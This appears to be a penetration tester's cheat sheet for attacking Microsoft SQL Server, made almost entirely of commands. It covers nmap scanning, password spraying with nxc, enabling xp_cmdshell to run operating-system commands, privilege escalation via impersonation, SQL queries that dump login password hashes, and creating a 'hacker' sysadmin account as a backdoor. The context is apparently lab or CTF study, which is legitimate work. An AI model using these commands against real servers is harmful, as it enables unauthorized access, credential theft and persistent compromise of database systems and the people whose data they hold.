# ***nmap***
```shell
sudo nmap -v -Pn -n -sCV -p1433 --script ms-sql-info,mssql-ntlm-info,ms-sql-empty-password `tip` -oN nmap_mssql_MACHINE
```
# ***nxc (X)***

```shell
nxc mssql `tip` -u users.txt -p passwords.txt --no-bruteforce [ --local-auth ]
```

```shell
# auth w/ smb open / closed
nxc mssql `tip` -u 'user' -p 'pass' [ --local-auth ] # smb open
nxc mssql `tip` -d `dom` -u 'user' -p 'pass' # smb closed
```

# ***query***
```shell
nxc mssql `tip` -u admin -p 'm$$ql_S@_P@ssW0rd!' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

# ***X (xpcmdshell)***
```
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXECUTE xp_cmdshell 'whoami';
```

```shell
nxc mssql `tip` -u admin -p 'm$$ql_S@_P@ssW0rd!' --local-auth -q 'EXECUTE sp_configure "show advanced options", 1; RECONFIGURE; EXECUTE sp_configure "xp_cmdshell", 1; RECONFIGURE; EXECUTE xp_cmdshell "whoami";'
```

```shell
impacket-mssqlclient [`dom`/]'Administrator:Lab123'@`tip` [ -windows-auth ] [ -p port ]

EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXECUTE xp_cmdshell 'whoami';
```


# ***mssql_priv (get dba)***
***if you see "can impersonate" try***
```shell
# 1 check if you can impersonate
nxc mssql `tip` -u user -p password -M mssql_priv
```

```shell
# 2 do the following
nxc mssql <ip> -u user -p password -M mssql_priv -o ACTION=privesc
nxc mssql <ip> -u user -p password -M mssql_priv -o ACTION=rollback
```

# ***impacket-mssqlclient***
```shell
impacket-mssqlclient [`dom`/]'Administrator:Lab123'@`tip` [ -windows-auth ] [ -p port ]
```

```shell
select @@version;

# current USER
SELECT user;  
SELECT system_user;  
SELECT user_name();  
SELECT loginame from master..sysprocesses where spid = @@SPID

# current DB
SELECT db_name()

# list DBs / use specific DB
SELECT name FROM master.dbo.sysdatabases;
SELECT name from master..sysdatabases;
SELECT name FROM sys.databases
USE master

# list TABLES in ALL DBs
EXEC sp_MSforeachdb 'USE [?]; SELECT ''?'' AS DatabaseName, * FROM INFORMATION_SCHEMA.TABLES;';
# in cur DB
SELECT DISTINCT table_catalog, table_name FROM information_schema.columns;
# specific DB
SELECT * FROM <DBNAME>.information_schema.tables;

# list COLUMNS in ALL TABLES
SELECT table_name, column_name, data_Type FROM information_schema.columns
# specific TABLE
SELECT table_name, column_name FROM information_schema.columns where table_name='TABLE_NAME'
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';

# Misc
# list Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;

# list USERS
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;

# Sysadmin priv user
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!';
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```